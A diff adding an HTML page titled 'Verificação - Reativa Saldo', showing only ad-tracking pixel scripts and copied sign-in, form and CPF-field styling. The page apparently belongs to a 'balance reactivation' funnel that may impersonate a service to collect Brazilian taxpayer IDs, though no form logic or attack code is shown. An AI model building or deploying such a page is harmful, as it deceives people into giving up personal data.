@@ -1,0 +1,1110 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificação - Reativa Saldo</title>
+  <head>
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '727014296718099');
+      fbq('track', 'PageView');
+      </script>
+    <!-- Meta Pixel Code -->
+    <!-- Meta Pixel Code -->
+  <noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=3998523763719331&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- End Meta Pixel Code -->
+    <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=SEU_PIXEL_ID_AQUI&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+  </head>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+  <link rel="icon" href="images/aaa.png" type="image/x-icon">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+  <script>
+    window.pixelId = "6864b5a6f5f781f9573c9410";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <style id="__jsx-2647271941">
+    .header.jsx-2647271941 {
+      box-sizing: border-box;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      height: 6rem;
+      padding: 1.5rem 5.125rem;
+      background-color: rgb(var(--theme-snow));
+      border-bottom: solid 1px rgba(75, 143, 239);
+    }
+    .header__left.jsx-2647271941 a.jsx-2647271941 {
+      padding: 0.75rem 1rem;
+      display: flex;
+      align-items: center;
+    }
+    .header.jsx-2647271941 .header__right.jsx-2647271941 {
+      display: flex;
+      align-items: center;
+    }
+    .header.jsx-2647271941 .header__right.jsx-2647271941 .header__link.jsx-2647271941 {
+      margin-left: 0.2rem;
+    }
+    @media screen and (max-width:960px) {
+      .header.jsx-2647271941 {
+        justify-content: center;
+        height: 64px;
+      }
+      .header.jsx-2647271941 .header__right.jsx-2647271941 {
+        display: none;
+      }
+    }
+  </style>
+  <style id="__jsx-3370773923">
+    .field-label.jsx-3370773923 {
+      display: block;
+      margin-bottom: 0.5rem;
+    }
+    .field-label--sm.jsx-3370773923 {
+      margin-bottom: 0.25rem;
+    }
+  </style>
+  <style id="__jsx-1299902653">
+    .field-error.jsx-1299902653 {
+      position: relative;
+      opacity: 0;
+      min-height: 0;
+      width: 100%;
+      overflow: hidden;
+      transition: var(--theme-transition);
+    }
+    .field-error--show.jsx-1299902653 {
+      opacity: 1;
+      min-height: 2rem;
+      margin: 0.5rem 0 -1rem;
+    }
+    .field-error__item.jsx-1299902653 {
+      position: absolute;
+      color: rgb(var(--theme-chilli));
+      top: 0;
+      left: 0;
+    }
+  </style>
+  <style id="__jsx-2024470100">
+    .field__input.jsx-2024470100 {
+      width: 100%;
+      height: 3.5rem;
+      padding: 1rem;
+      border: 1px solid rgba(var(--theme-silver));
+      border-radius: var(--theme-border-radius);
+      transition: var(--theme-transition);
+      transition-property: border, box-shadow;
+    }
+    .field__input.jsx-2024470100:hover,
+    .field__input.jsx-2024470100:focus {
+      border-color: rgba(var(--theme-blue));
+    }
+    .field__input.jsx-2024470100:focus {
+      outline: none;
+      box-shadow: 0 0 0 4px rgba(var(--theme-blue), 0.2);
+    }
+    .field__content.jsx-2024470100 {
+      position: relative;
+      z-index: 0;
+    }
+    .field--sm.jsx-2024470100 .field__input.jsx-2024470100 {
+      height: 3rem;
+      padding: 0.75rem 1rem;
+    }
+    .field--loading.jsx-2024470100 .field__input.jsx-2024470100,
+    .field--error.jsx-2024470100 .field__input.jsx-2024470100 {
+      padding-right: 3.5rem;
+    }
+    .field--error.jsx-2024470100 .field__input.jsx-2024470100 {
+      border-color: rgba(var(--theme-chilli));
+    }
+    .field--error.jsx-2024470100 .field__input.jsx-2024470100:focus {
+      box-shadow: 0 0 0 4px rgba(var(--theme-chilli), 0.2);
+    }
+    .field--loading.jsx-2024470100:after,
+    .field--error.jsx-2024470100:after {
+      content: '';
+      display: block;
+      position: absolute;
+      top: 50%;
+      right: 1.062rem;
+      width: 1.5rem;
+      height: 1.5rem;
+      margin-top: -0.75rem;
+      background: transparent no-repeat center center;
+      background-size: contain;
+      z-index: 1;
+      pointer-events: none;
+    }
+    .field--error.jsx-2024470100:after {
+      background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxwYXRoIGZpbGw9IiNENjEwM0IiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxMiAxMnMtNS4zNzMgMTItMTIgMTJTMCAxOC42MjcgMCAxMiA1LjM3MyAwIDEyIDB6bTAgMTVjLS44MjggMC0xLjUuNjcyLTEuNSAxLjVTMTEuMTcyIDE4IDEyIDE4czEuNS0uNjcyIDEuNS0xLjVTMTIuODI4IDE1IDEyIDE1em0wLTguNWMtLjgyOCAwLTEuNS42NzItMS41IDEuNXY0bC4wMDcuMTQ0Yy4wNzMuNzYxLjcxMyAxLjM1NiAxLjQ5MyAxLjM1Ni44MjggMCAxLjUtLjY3MiAxLjUtMS41VjhsLS4wMDctLjE0NEMxMy40MiA3LjA5NSAxMi43OCA2LjUgMTIgNi41eiIvPgo8L3N2Zz4K');
+    }
+    .field--loading.jsx-2024470100:after {
+      background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjE3IDE3IDY2IDY2IiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiPjxjaXJjbGUgY3g9IjUwIiBjeT0iNTAiIHI9IjMwIiBzdHJva2U9InJnYmEoMCwgOCwgMzgsIDAuMTYpIiBzdHJva2Utd2lkdGg9IjciIGZpbGw9Im5vbmUiPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjUwIiBjeT0iNTAiIHI9IjMwIiBzdHJva2U9IiMwYjY0ZTAiIHN0cm9rZS13aWR0aD0iNiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBmaWxsPSJub25lIiB0cmFuc2Zvcm09InJvdGF0ZSg0OC45MjUgNTAgNTApIj48YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGR1cj0iMS41IiB2YWx1ZXM9IjAgNTAgNTA7MTgwIDUwIDUwOzcyMCA1MCA1MCIga2V5VGltZXM9IjA7MC41OzEiPjwvYW5pbWF0ZVRyYW5zZm9ybT48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJzdHJva2UtZGFzaGFycmF5IiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIgZHVyPSIxLjUiIHZhbHVlcz0iMTguODQ5NTU1OTIxNTM4NzYgMTY5LjY0NjAwMzI5Mzg0ODgyOzk0LjI0Nzc3OTYwNzY5MzggOTQuMjQ3Nzc5NjA3NjkzNzc7MTguODQ5NTU1OTIxNTM4NzYgMTY5LjY0NjAwMzI5Mzg0ODgyIiBrZXlUaW1lcz0iMDswLjU7MSI+PC9hbmltYXRlPjwvY2lyY2xlPjwvc3ZnPg==');
+    }
+  </style>
+  <style id="__jsx-1222364814">
+    .ec-form-submit.jsx-1222364814 {
+      display: flex;
+      flex-direction: row-reverse;
+      justify-content: end;
+    }
+    .ec-form-submit.--align-center.jsx-1222364814 {
+      justify-content: center;
+    }
+    .ec-form-submit.jsx-1222364814>* {
+      margin: 0 0 0 1.5rem;
+      width: 14.25rem;
+    }
+    .ec-form-submit.jsx-1222364814>*:first-child:last-child,
+    .ec-form-submit.jsx-1222364814>*~* {
+      margin: 0;
+    }
+    @media (max-width:1015px) {
+      .ec-form-submit.jsx-1222364814 {
+        display: flex;
+        flex-direction: column;
+      }
+      .ec-form-submit.jsx-1222364814>* {
+        width: 100%;
+        margin: 0;
+      }
+      .ec-form-submit.jsx-1222364814>*~* {
+        margin: 1rem 0 0;
+      }
+      .ec-form-submit.--submit-align-bottom.jsx-1222364814 {
+        flex-direction: column-reverse;
+        flex: 1 1 auto;
+      }
+      .ec-form-submit.--submit-align-bottom.jsx-1222364814>* {
+        margin: 0 0 1rem;
+      }
+      .ec-form-submit.--submit-align-bottom.jsx-1222364814>*:first-child {
+        margin: auto 0 0;
+      }
+    }
+  </style>
+  <style id="__jsx-2110056567">
+    .btn-submit.jsx-2110056567 {
+      width: 100%;
+    }
+    button.btn-try-again.jsx-2110056567,
+    .ec-form-submit a.btn-signup {
+      width: 100%;
+    }
+    input[name='cpf']:disabled {
+      cursor: not-allowed;
+    }
+  </style>
+  <style id="__jsx-564433028">
+    .redirectToB2b.jsx-564433028 {
+      margin-top: 7rem;
+      text-align: center;
+    }
+    @media screen and (min-width:960px) {
+      .redirectToB2b.jsx-564433028 {
+        margin-top: 9.125rem;
+      }
+    }
+  </style>
+  <style id="__jsx-1255997722">
+    .card.jsx-1255997722 {
+      display: flex;
+      flex-direction: column;
+      background-color: rgba(var(--theme-surface-snow));
+      border-radius: var(--theme-border-radius);
+      position: relative;
+    }
+    .--with-padding.jsx-1255997722 {
+      padding: 1rem;
+    }
+    .card__link.jsx-1255997722 {
+      display: block;
+      text-align: left;
+      padding: 1rem;
+    }
+    .card__link.jsx-1255997722:not(:hover):not(:active):not(:focus) {
+      border-top: 1px solid rgba(var(--theme-surface-palegray));
+      --theme-button-border-radius: 0 0 var(--theme-border-radius) var(--theme-border-radius);
+    }
+  </style>
+  <style id="__jsx-1670084299">
+    .sign-in.jsx-1670084299 {
+      width: 24.5rem;
+      min-height: 31.75rem;
+      background-color: rgb(var(--theme-snow));
+      border: solid 1px rgb(var(--theme-lightgray));
+      border-radius: 0.5rem;
+      box-shadow: 0 4px 9px 0 rgba(var(--theme-black), 0.1);
+    }
+    .sign-in.jsx-1670084299 .sign-in__card.jsx-1670084299 {
+      height: 100%;
+    }
+    .sign-in.jsx-1670084299 .sign-in__title.small.jsx-1670084299 {
+      font-size: 1.5rem;
+      letter-spacing: -0.053rem;
+    }
+    .sign-in.jsx-1670084299 .sign-in__content.jsx-1670084299 {
+      padding: 1.5rem;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+    .sign-in.jsx-1670084299 .--align-center.jsx-1670084299 {
+      text-align: center;
+    }
+    .sign-in__forgot.jsx-1670084299 {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      height: 3rem;
+      padding-right: 0.5rem;
+    }
+    .sign-in__icon.jsx-1670084299 {
+      display: flex;
+      justify-content: center;
+    }
+    .fullWidth.jsx-1670084299 {
+      width: 100%;
+    }
+    @media screen and (max-width:960px) {
+      .sign-in.jsx-1670084299 {
+        max-width: 392px;
+        width: 100%;
+        border: none;
+        box-shadow: none;
+      }
+      .sign-in.jsx-1670084299 .sign-in__content.jsx-1670084299 {
+        padding: 0 0.5rem;
+      }
+      .sign-in.jsx-1670084299 .sign-in__title.jsx-1670084299 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
+  <style id="__jsx-2857347777">
+    .modal.jsx-2857347777 {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(var(--theme-dark-low));
+      backdrop-filter: blur(6px);
+      z-index: 9999;
+    }
+    .modal__title.jsx-2857347777 {
+      position: sticky;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: rgba(var(--theme-snow));
+      text-align: center;
+      z-index: 20;
+    }
+    .title-padding.jsx-2857347777 {
+      padding: 1rem;
+    }
+    .modal__main.jsx-2857347777 {
+      position: fixed;
+      background: rgba(var(--theme-snow));
+      min-width: 30rem;
+      max-width: 80%;
+      height: auto;
+      max-height: 90%;
+      top: 50%;
+      left: 50%;
+      overflow-y: auto;
+      transform: translate(-50%, -50%);
+      border-radius: var(--theme-border-radius);
+    }
+    .modal__main--small.jsx-2857347777 {
+      max-width: 45.75rem;
+    }
+    .modal.jsx-2857347777 .modal__button__close.jsx-2857347777 {
+      color: rgba(var(--theme-dark-low));
+      right: 0.5rem;
+      top: 0.5rem;
+      padding: 0.5rem;
+      background-color: rgba(var(--theme-snow));
+      border-radius: var(--theme-border-radius);
+      cursor: pointer;
+      position: absolute;
+    }
+    .modal.jsx-2857347777 .modal__button__close.jsx-2857347777 img.jsx-2857347777 {
+      height: 1.5rem;
+      width: 1.5rem;
+      opacity: 0.44;
+    }
+    .modal__body.jsx-2857347777 {
+      padding: 1rem 1.5rem 1.5rem 1.5rem;
+    }
+    .modal--show.jsx-2857347777 {
+      display: block;
+    }
+    .modal--hide.jsx-2857347777 {
+      display: none;
+    }
+    @media (max-width:480px) {
+      .modal__main--mobile.jsx-2857347777,
+      .modal__main--half-mobile.jsx-2857347777 {
+        width: 100%;
+        max-width: 100%;
+        min-width: 0;
+      }
+      .modal__main--mobile.jsx-2857347777 {
+        height: 100%;
+        max-height: 100%;
+        border-radius: 0;
+      }
+      .modal__main--half-mobile.jsx-2857347777 {
+        top: auto;
+        left: 0;
+        bottom: 0;
+        border-bottom-left-radius: 0;
+        border-bottom-right-radius: 0;
+        transform: translate(0%, 0%);
+      }
+      .title-padding.jsx-2857347777 {
+        padding: 1.125rem;
+      }
+    }
+  </style>
+  <style id="__jsx-1078615936">
+    .form-loader.jsx-1078615936 {
+      text-align: center;
+      margin: auto;
+    }
+    .form-loader.jsx-1078615936 .form-loader-icon {
+      font-size: 4rem;
+      margin: auto;
+    }
+  </style>
+  <style id="__jsx-1369224449">
+    .eu-grid__inner.jsx-1369224449 {
+      display: flex;
+      flex-flow: row wrap;
+      margin: 0 calc(var(--grid-gutter) / 2 * -1);
+    }
+  </style>
+  <style id="__jsx-2723299336">
+    .container.jsx-2723299336 {
+      box-sizing: border-box;
+      margin-left: auto;
+      margin-right: auto;
+      width: 100%;
+      max-width: var(--grid-container-max-width);
+      padding-left: var(--grid-margin);
+      padding-right: var(--grid-margin);
+    }
+  </style>
+  <style id="__jsx-2119886246">
+    .content.jsx-2119886246 {
+      margin: 2rem 0;
+    }
+  </style>
+  <style id="__jsx-695939317">
+    .footer.jsx-695939317 {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      height: 6rem;
+      padding-top: 1rem;
+      margin-top: auto;
+      background: rgb(var(--theme-snow));
+      border-top: solid 1px rgba(214, 215, 220);
+    }
+    @media screen and (max-width:960px) {
+      .footer.jsx-695939317 {
+        height: 5rem;
+      }
+    }
+  </style>
+  <style id="__jsx-2555939233">
+    :root {
+      --theme-white: 255, 255, 255;
+      --theme-black: 0, 0, 0;
+      --theme-text-dark-high: 0, 0, 0, 0.8;
+      --theme-text-dark-medium: 0, 0, 0, 0.66;
+      --theme-text-dark-low: 0, 0, 0, 0.44;
+      --theme-text-light-solid: 255, 255, 255;
+      --theme-text-light-high: 255, 255, 255, 0.8;
+      --theme-surface-snow: 255, 255, 255;
+      --theme-surface-palegray: 247, 247, 247;
+      --theme-surface-lightgray: 236, 236, 236;
+      --theme-surface-silver: 216, 216, 216;
+      --theme-surface-darkgrey: 87, 87, 85;
+      --theme-primary-300: 231, 66, 142;
+      --theme-primary: 230, 56, 136;
+      --theme-primary-700: 228, 43, 128;
+      --theme-secondary-300: 231, 66, 142;
+      --theme-secondary: 230, 56, 136;
+      --theme-secondary-700: 228, 43, 128;
+      --theme-accent-300: 231, 66, 142;
+      --theme-accent: 230, 56, 136;
+      --theme-accent-700: 228, 43, 128;
+    }
+  </style>
+  <style id="__jsx-198070795">
+    .et-white { color: rgb(var(--theme-white)); }
+    .et-black { color: rgb(var(--theme-black)); }
+    .et-text-dark-high { color: rgba(var(--theme-text-dark-high)); }
+    .et-text-dark-medium { color: rgba(var(--theme-text-dark-medium)); }
+    .et-text-dark-low { color: rgba(var(--theme-text-dark-low)); }
+    .et-text-light-solid { color: rgb(var(--theme-text-light-solid)); }
+    .et-text-light-high { color: rgba(var(--theme-text-light-high)); }
+    .et-surface-snow { color: rgb(var(--theme-surface-snow)); }
+    .et-surface-palegray { color: rgb(var(--theme-surface-palegray)); }
+    .et-surface-lightgray { color: rgb(var(--theme-surface-lightgray)); }
+    .et-surface-silver { color: rgb(var(--theme-surface-silver)); }
+    .et-surface-darkgrey { color: rgb(var(--theme-surface-darkgrey)); }
+    .et-primary-300 { color: rgb(var(--theme-primary-300)); }
+    .et-primary { color: #149846; }
+    .et-primary-700 { color: rgb(var(--theme-primary-700)); }
+    .et-secondary-300 { color: rgb(var(--theme-secondary-300)); }
+    .et-secondary { color: rgb(var(--theme-secondary)); }
+    .et-secondary-700 { color: rgb(var(--theme-secondary-700)); }
+    .et-accent-300 { color: #149846; }
+    .et-accent { color: #149846; }
+    .et-accent-700 { color: #149846; }
+  </style>
+  <style id="__jsx-3245007174">
+    * { box-sizing: border-box; }
+    a, abbr, acronym, address, applet, b, big, blockquote, body, caption, center, cite, code, dd, del, dfn, div, dl, dt, em, fieldset, font, form, h1, h2, h3, h4, h5, h6, html, i, iframe, img, ins, kbd, label, legend, li, object, ol, p, pre, q, s, samp, small, span, strike, strong, sub, sup, table, tbody, td, tfoot, th, thead, tr, tt, u, ul, var {
+      margin: 0;
+      padding: 0;
+      outline: none;
+      border: none;
+      background: 0 0;
+      vertical-align: baseline;
+      font-size: 100%;
+    }
+    body { line-height: 1; }
+    ol, ul { list-style: none; }
+    blockquote, q { quotes: none; }
+    blockquote:after, blockquote:before, q:after, q:before { content: ""; content: none; }
+    :focus { outline: none; }
+    ins { text-decoration: none; }
+    del { text-decoration: line-through; }
+    table { border-spacing: 0; border-collapse: collapse; }
+    .ea-button, body, html {
+      text-decoration: inherit;
+      text-transform: inherit;
+      letter-spacing: normal;
+      font-family: Roboto, sans-serif;
+      -moz-osx-font-smoothing: grayscale;
+      -webkit-font-smoothing: antialiased;
+    }
+    .ea-button {
+      position: relative;
+      display: inline-flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      box-sizing: border-box;
+      padding: 0.75rem 1.25rem;
+      min-width: 6rem;
+      height: 2.5rem;
+      outline: none;
+      border-radius: 0.25rem;
+      border: 1px solid transparent;
+      vertical-align: middle;
+      text-align: center;
+      font-weight: 700;
+      font-style: normal;
+      font-stretch: normal;
+      font-size: 1rem;
+      line-height: 1;
+      transition-timing-function: ease;
+      transition-duration: 0.3s;
+      transition-property: background-color, color, box-shadow, color, border;
+      user-select: none;
+    }
+    .ea-button:disabled, .ea-button[disabled] {
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+    .ea-button::-moz-focus-inner { padding: 0; border: none; }
+    .ea-button:active, .ea-button:focus { outline: none; }
+    .ea-button:hover { cursor: pointer; }
+    .ea-button--size-sm { min-width: 4.5rem; height: 2.25rem; font-size: 0.875rem; }
+    .ea-button--size-lg { min-width: 8rem; height: 3rem; }
+    .ea-button--solid { background-color: #149846; color: rgb(var(--theme-white)); }
+    .ea-button--solid:hover { background-color: #12783b; }
+    .ea-button--solid:focus { background-color: #12783b; box-shadow: 0 0 0 3px rgba(20, 152, 70, 0.24); }
+    .ea-button--solid:active { border-color: hsla(0, 0%, 100%, 0.5); background-color: #12783b; box-shadow: 0 0 0 3px rgba(20, 152, 70, 0.24); }
+    .ea-button--solid:disabled, .ea-button--solid[disabled] { background-color: rgba(var(--theme-black), 0.16); }
+    .ea-typography, body {
+      text-decoration: inherit;
+      text-transform: inherit;
+      letter-spacing: normal;
+      font-size: 16px;
+      font-family: Roboto, sans-serif;
+      -moz-osx-font-smoothing: grayscale;
+      -webkit-font-smoothing: antialiased;
+    }
+    .ea-typography--display { letter-spacing: -0.025rem; font-weight: 700; font-size: 2.5rem; line-height: 2.75rem; }
+    @media (min-width:960px) { .ea-typography--display { font-size: 3rem; line-height: 3.25rem; } }
+    .ea-typography--heading-l { letter-spacing: -0.022727272727273rem; font-weight: 700; font-size: 2rem; line-height: 2.25rem; }
+    @media (min-width:960px) { .ea-typography--heading-l { font-size: 2.5rem; line-height: 2.75rem; } }
+    .ea-typography--heading-m { letter-spacing: -0.022222222222222rem; font-weight: 700; font-size: 1.5rem; line-height: 1.75rem; }
+    @media (min-width:960px) { .ea-typography--heading-m { font-size: 2rem; line-height: 2.25rem; } }
+    .ea-typography--heading-s { letter-spacing: -0.021428571428571rem; font-weight: 700; font-size: 1.25rem; line-height: 1.5rem; }
+    @media (min-width:960px) { .ea-typography--heading-s { font-size: 1.5rem; line-height: 1.75rem; } }
+    .ea-typography--heading-xs { font-weight: 700; line-height: 1.5rem; font-size: 1.125rem; }
+    @media (min-width:960px) { .ea-typography--heading-xs { font-size: 1.25rem; } }
+    .ea-typography--subheading { font-weight: 700; font-size: 1rem; line-height: 1.25rem; }
+    .ea-typography--body-m { font-weight: 400; font-size: 1rem; line-height: 1.5rem; }
+    .ea-typography--body-p { font-weight: 400; font-size: 0.875rem; line-height: 1.25rem; }
+    .ea-typography--caption { font-weight: 400; font-size: 0.75rem; line-height: 1rem; }
+    .ea-typography--emphasys { font-weight: 700; }
+  </style>
+  <style id="__jsx-359316987">
+    :root {
+      --theme-black: 0, 8, 38;
+      --theme-dark-blue: 29, 79, 145;
+      --theme-dark-blue-lighter: 236, 239, 244;
+      --theme-light-blue: 66, 109, 169;
+      --theme-light-blue-lighter: 239, 240, 240;
+      --theme-purple: 109, 32, 119;
+      --theme-purple-lighter: 242, 237, 242;
+      --theme-raspberry: 175, 22, 133;
+      --theme-raspberry-lighter: 246, 234, 242;
+      --theme-magenta: 230, 56, 136;
+      --theme-magenta-lighter: 246, 234, 239;
+      --theme-light-blue-5-s10-l10: 206, 219, 238;
+      --theme-light-blue-5-s20-l20: 162, 190, 230;
+      --theme-purple-5-s10-l10: 231, 208, 231;
+      --theme-purple-5-s20-l20: 220, 168, 220;
+      --theme-snow: 255, 255, 255;
+      --theme-palegray: 245, 247, 249;
+      --theme-silver: 212, 218, 224;
+      --theme-lightgray: 230, 234, 238;
+      --theme-orange: 255, 143, 28;
+      --theme-orange-lighter: 249, 240, 231;
+      --theme-lime: 183, 191, 16;
+      --theme-lime-lighter: 246, 247, 233;
+      --theme-credit-green: 0, 175, 125;
+      --theme-credit-green-lighter: 231, 249, 244;
+      --theme-happy-blue: 0, 158, 227;
+      --theme-happy-blue-lighter: 231, 243, 249;
+      --theme-blue: 11, 100, 224;
+      --theme-blue-lighter: 232, 238, 248;
+      --theme-forest-green: 78, 168, 2;
+      --theme-forest-green-lighter: 239, 249, 231;
+      --theme-chilli: 214, 16, 59;
+      --theme-chilli-lighter: 247, 233, 236;
+      --theme-pumpkin: 227, 109, 0;
+      --theme-pumpkin-lighter: 249, 239, 231;
+      --theme-violet: 172, 11, 229;
+      --theme-violet-lighter: 243, 232, 248;
+      --theme-accent: var(--theme-magenta);
+      --theme-text-dark-low: var(--theme-black), 0.44;
+      --theme-text-dark-medium: var(--theme-black), 0.6;
+      --theme-text-dark-high: var(--theme-black), 0.8;
+      --theme-dark-low: var(--theme-black), 0.44;
+      --theme-dark-medium: var(--theme-black), 0.6;
+      --theme-dark-medium-high: var(--theme-black), 0.7;
+      --theme-dark-high: var(--theme-black), 0.8;
+    }
+    .et-text-accent { color: rgba(var(--theme-accent)); }
+    .et-snow { color: rgba(var(--theme-snow)); }
+    .et-palegray { color: rgba(var(--theme-palegray)); }
+    .et-lightgray { color: rgba(var(--theme-lightgray)); }
+    .et-dark-low { color: rgba(var(--theme-text-dark-low)); }
+    .et-dark-medium { color: rgba(var(--theme-text-dark-medium)); }
+    .et-dark-high { color: rgba(var(--theme-text-dark-high)); }
+    .et-light-high { color: rgba(var(--theme-text-light-high)); }
+    .et-light-solid { color: rgba(var(--theme-text-light-solid)); }
+    .et-dark-blue { color: rgba(var(--theme-dark-blue)); }
+    .et-dark-blue-lighter { color: rgba(var(--theme-dark-blue-lighter)); }
+    .et-magenta { color: rgba(var(--theme-magenta)); }
+    .et-magenta-lighter { color: rgba(var(--theme-magenta-lighter)); }
+    .et-light-blue { color: rgba(var(--theme-light-blue)); }
+    .et-light-blue-lighter { color: rgba(var(--theme-light-blue-lighter)); }
+    .et-purple { color: rgba(var(--theme-purple)); }
+    .et-purple-lighter { color: rgba(var(--theme-purple-lighter)); }
+    .et-raspberry { color: rgba(var(--theme-raspberry)); }
+    .et-raspberry-lighter { color: rgba(var(--theme-raspberry-lighter)); }
+    .et-orange { color: rgba(var(--theme-orange)); }
+    .et-orange-lighter { color: rgba(var(--theme-orange-lighter)); }
+    .et-lime { color: rgba(var(--theme-lime)); }
+    .et-lime-lighter { color: rgba(var(--theme-lime-lighter)); }
+    .et-happy-blue { color: rgba(var(--theme-happy-blue)); }
+    .et-credit-green-lighter { color: rgba(var(--theme-credit-green-lighter)); }
+    .et-credit-green { color: rgba(var(--theme-credit-green)); }
+    .et-happy-blue-lighter { color: rgba(var(--theme-happy-blue-lighter)); }
+    .et-blue { color: rgba(var(--theme-blue)); }
+    .et-blue-lighter { color: rgba(var(--theme-blue-lighter)); }
+    .et-forest-green { color: rgba(var(--theme-forest-green)); }
+    .et-forest-green-lighter { color: rgba(var(--theme-forest-green-lighter)); }
+    .et-chilli { color: rgba(var(--theme-chilli)); }
+    .et-chilli-lighter { color: rgba(var(--theme-chilli-lighter)); }
+    .et-pumpkin { color: rgba(var(--theme-pumpkin)); }
+    .et-pumpkin-lighter { color: rgba(var(--theme-pumpkin-lighter)); }
+    .et-violet { color: rgba(var(--theme-violet)); }
+    .et-violet-lighter { color: rgba(var(--theme-violet-lighter)); }
+  </style>
+  <style id="__jsx-2521071326">
+    button {
+      border: none;
+      margin: 0;
+      padding: 0;
+      width: auto;
+      overflow: visible;
+      text-align: inherit;
+      border-radius: 0;
+      cursor: pointer;
+      background: transparent;
+      color: inherit;
+      font: inherit;
+      line-height: normal;
+      -webkit-font-smoothing: inherit;
+      -moz-osx-font-smoothing: inherit;
+    }
+    button:-moz-focus-inner { border: 0; padding: 0; }
+    a { text-decoration: none; }
+  </style>
+  <style id="__jsx-1146511973">
+    :root {
+      --grid-margin-phone-sm: 0.5rem;
+      --grid-margin-phone-md: 1rem;
+      --grid-margin-desktop: 0;
+      --grid-margin: var(--grid-margin-phone-sm);
+      --grid-gutter-phone-sm: 1rem;
+      --grid-gutter-phone-md: 1rem;
+      --grid-gutter-desktop: 1.5rem;
+      --grid-gutter: var(--grid-gutter-phone-sm);
+      --grid-container-max-width: 984px;
+    }
+    @media (min-width:360px) {
+      :root { --grid-margin: var(--grid-margin-phone-md); --grid-gutter: var(--grid-gutter-phone-md); }
+    }
+    @media (min-width:63.5rem) {
+      :root { --grid-gutter: var(--grid-gutter-desktop); --grid-margin: var(--grid-margin-desktop); }
+    }
+  </style>
+  <style id="__jsx-867263301">
+    :root {
+      --theme-border-radius: 10px;
+      --theme-button-border-radius: var(--theme-border-radius);
+      --theme-box-shadow: 0 1px 4px 0 rgba(0, 8, 38, 0.04);
+      --theme-transition: 0.3s ease;
+    }
+    body {
+      color: rgba(var(--theme-text-dark-high));
+      background-color: rgba(var(--theme-snow));
+      -webkit-tap-highlight-color: rgba(var(--theme-accent), 0.03);
+    }
+    a, button {
+      border: 1px solid transparent;
+      border-radius: var(--theme-border-radius);
+      transition: var(--theme-transition);
+      transition-property: border, box-shadow;
+      padding: 0.5rem;
+    }
+    a:hover, button:hover { border-color: rgba(var(--theme-blue)); }
+    a:focus, button:focus { outline: none; box-shadow: 0 0 0 4px rgba(var(--theme-blue), 0.2); }
+    .eu-no-select { user-select: none; }
+    .ea-button { border-radius: var(--theme-button-border-radius); }
+    .ea-button:disabled { color: rgb(var(--theme-dark-low)); }
+    a.ea-button.ea-typography {
+      transition: var(--theme-transition);
+      border-radius: var(--theme-border-radius);
+      padding: 0.75rem;
+    }
+    a.ea-button.ea-typography:hover { color: rgb(var(--theme-primary-300)); }
+    a.ea-button.ea-typography:hover, a.ea-button.ea-typography:focus { background-color: rgba(var(--theme-accent), 0.08); }
+    a.ea-button.ea-typography:focus { box-shadow: 0 0 0 4px rgba(var(--theme-accent), 0.16); color: rgb(var(--theme-primary-700)); }
+    a.ea-button.ea-typography:active { background: transparent; box-shadow: 0 0 0 2px rgba(var(--theme-accent), 0.24); color: rgb(var(--theme-primary-300)); }
+    .ea-typography--emphasys { font-weight: bold; }
+    .eu-w-100 { width: 100%; }
+    .eu-w-80 { width: 80%; }
+    .eu-text-ellipsis { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%; }
+    .eu-text-center { text-align: center; }
+    .eu-flex-r, .eu-flex { display: flex; flex-direction: row; justify-content: space-between; }
+    .eu-inline-flex { display: inline-flex; }
+    .eu-fd-column { flex-direction: column; justify-content: left; }
+    .eu-facc, .eu-fjc-center { justify-content: center; }
